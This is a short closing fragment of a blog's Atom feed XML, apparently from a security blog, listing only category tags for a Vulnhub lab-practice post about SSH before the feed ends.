    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="ssh" scheme="https://syst1m.top/tags/ssh/"/>
    
  </entry>
  
</feed>
